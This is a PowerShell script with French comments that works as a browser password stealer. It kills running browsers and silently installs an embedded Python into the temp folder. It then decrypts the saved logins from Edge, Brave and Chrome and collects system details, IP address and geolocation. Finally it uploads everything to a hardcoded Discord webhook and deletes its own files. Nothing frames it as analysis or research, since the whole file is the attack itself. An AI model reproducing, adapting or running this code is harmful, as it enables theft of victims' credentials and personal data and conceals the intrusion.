$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

# Kill browsers plus agressivement
taskkill /F /IM msedge.exe 2>$null
taskkill /F /IM brave.exe 2>$null
taskkill /F /IM chrome.exe 2>$null
taskkill /F /IM firefox.exe 2>$null
# Tuer aussi les processus en arrière-plan
taskkill /F /FI "IMAGENAME eq msedge.exe*" 2>$null
taskkill /F /FI "IMAGENAME eq brave.exe*" 2>$null
taskkill /F /FI "IMAGENAME eq chrome.exe*" 2>$null
Start-Sleep -Seconds 3

try{
# Vérifier si Python est déjà installé
$pyPath="$env:TEMP\py"
$needInstall=$false

if(!(Test-Path "$pyPath\python.exe")){
 $needInstall=$true
}else{
 cd $pyPath
 $testLibs=.\python.exe -c "import Crypto,win32crypt,requests;print('OK')" 2>$null
 if($testLibs -ne "OK"){$needInstall=$true}
}

if($needInstall){
 Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
 Expand-Archive "$env:TEMP\py.zip" $pyPath -Force
 (Get-Content "$pyPath\python311._pth") -replace '#import site','import site'|Out-File "$pyPath\python311._pth" -Encoding ascii
 Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$pyPath\gp.py" -UseBasicParsing
 cd $pyPath
 .\python.exe gp.py --no-warn-script-location 2>$null
 .\python.exe -m pip install pycryptodome pypiwin32 requests --quiet 2>$null
 Remove-Item "$env:TEMP\py.zip" -Force -EA 0
}

cd $pyPath

@'
import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time
from Crypto.Cipher import AES

try:
 import requests
 ip=requests.get("https://api.ipify.org",timeout=3).text
 geo=requests.get(f"http://ip-api.com/json/{ip}",timeout=3).json()
 location=f"{geo['city']}, {geo['regionName']}, {geo['country']}"
 isp=geo.get('isp','N/A')
except:
 ip="N/A"
 location="N/A"
 isp="N/A"

import locale
language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"

def d(db,st,n):
 try:
  # Vérifier si les fichiers existent
  if not os.path.exists(db):
   return []
  if not os.path.exists(st):
   return []
  
  # Lire la clé de chiffrement
  with open(st,'r',encoding='utf-8') as f:
   local_state=json.load(f)
  
  encrypted_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])
  encrypted_key=encrypted_key[5:]  # Enlever "DPAPI"
  k=win32crypt.CryptUnprotectData(encrypted_key,None,None,None,0)[1]
  
  # Copier le fichier avec retry
  temp_db=f"t_{n}.db"
  max_retries=3
  for attempt in range(max_retries):
   try:
    if os.path.exists(temp_db):
     os.remove(temp_db)
    shutil.copy2(db,temp_db)
    break
   except:
    if attempt < max_retries-1:
     time.sleep(1)
    else:
     return []
  
  # Lire la base de données
  r=[]
  try:
   c=sqlite3.connect(temp_db)
   cursor=c.cursor()
   cursor.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''")
   
   for row in cursor.fetchall():
    try:
     url=row[0]
     user=row[1]
     enc_pwd=row[2]
     
     if enc_pwd and len(enc_pwd)>15:
      # Déchiffrement AES-GCM
      nonce=enc_pwd[3:15]
      ciphertext=enc_pwd[15:-16]
      tag=enc_pwd[-16:]
      
      cipher=AES.new(k,AES.MODE_GCM,nonce=nonce)
      pwd=cipher.decrypt_and_verify(ciphertext,tag).decode('utf-8','ignore')
      
      r.append(f"[{n}] {url}\nUsername: {user}\nPassword: {pwd}\n")
    except Exception as e:
     # Ignorer les erreurs de déchiffrement individuelles
     pass
   
   c.close()
  except Exception as e:
   pass
  finally:
   # Nettoyer le fichier temporaire
   try:
    if os.path.exists(temp_db):
     os.remove(temp_db)
   except:
    pass
  
  return r
  
 except Exception as e:
  return []

# Collecter les résultats de TOUS les navigateurs
res=[]
browsers=[]

# EDGE
e=os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
if os.path.exists(f"{e}\\Default\\Login Data"):
 edge_res=d(f"{e}\\Default\\Login Data",f"{e}\\Local State","EDGE")
 res.extend(edge_res)
 browsers.append(f"Edge: {len(edge_res)} passwords")

# BRAVE
b=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
if os.path.exists(f"{b}\\Default\\Login Data"):
 brave_res=d(f"{b}\\Default\\Login Data",f"{b}\\Local State","BRAVE")
 res.extend(brave_res)
 browsers.append(f"Brave: {len(brave_res)} passwords")

# CHROME
g=os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
if os.path.exists(f"{g}\\Default\\Login Data"):
 chrome_res=d(f"{g}\\Default\\Login Data",f"{g}\\Local State","CHROME")
 res.extend(chrome_res)
 browsers.append(f"Chrome: {len(chrome_res)} passwords")

# Informations système
browser_info="\n".join(browsers) if browsers else "No browsers found"

info=f"""{'='*60}
SYSTEM INFORMATION
{'='*60}
Date/Time: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Hostname: {socket.gethostname()}
Language: {language}
Public IP: {ip}
Location: {location}
ISP: {isp}
{'='*60}

BROWSERS DETECTED:
{browser_info}

TOTAL PASSWORDS: {len(res)}
{'='*60}

"""

# Toujours créer le fichier, même s'il n'y a pas de résultats
with open("p.txt","w",encoding="utf-8") as f:
 f.write(info)
 if res:
  f.write("".join(res))
 else:
  f.write("No passwords found.\n")

print("OK")
'@|Out-File "e.py" -Encoding UTF8

$r=.\python.exe e.py 2>$null

if($r -eq "OK"){
 curl.exe -F "file=@p.txt" $wh 2>$null
 Remove-Item p.txt,e.py -Force -EA 0
}

cd $env:TEMP

}catch{
 curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"Failed on $env:COMPUTERNAME - Error: $($_.Exception.Message)`"}" $wh
}
